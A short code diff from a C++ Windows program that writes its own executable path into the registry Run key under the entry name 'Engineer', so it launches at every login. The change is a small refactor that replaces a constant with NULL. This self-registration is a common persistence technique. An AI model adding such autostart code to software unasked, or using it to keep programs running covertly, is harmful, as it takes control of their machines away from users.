@@ -13,8 +13,6 @@ const LPCSTR TARGET_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 // The field under which we will be named
 const LPCWSTR KEY_ENTRY_NAME = L"Engineer";
 
-const HMODULE MY_EXECUTABLE = NULL;
-
 /*
  * Uses a mutex to make sure that the program is executed once.
  *
@@ -48,7 +46,7 @@ int main() {
 	wprintf(L"Old key value: %ls\n", autostartKey.getKeyValue(KEY_ENTRY_NAME));
 
 	WCHAR filename[MAX_PATH];
-	GetModuleFileNameW(MY_EXECUTABLE, filename, MAX_PATH);
+	GetModuleFileNameW(NULL, filename, MAX_PATH); //NULL=The executable running this.
 	autostartKey.setKeyValue(filename ,KEY_ENTRY_NAME);
 
 	return 0;
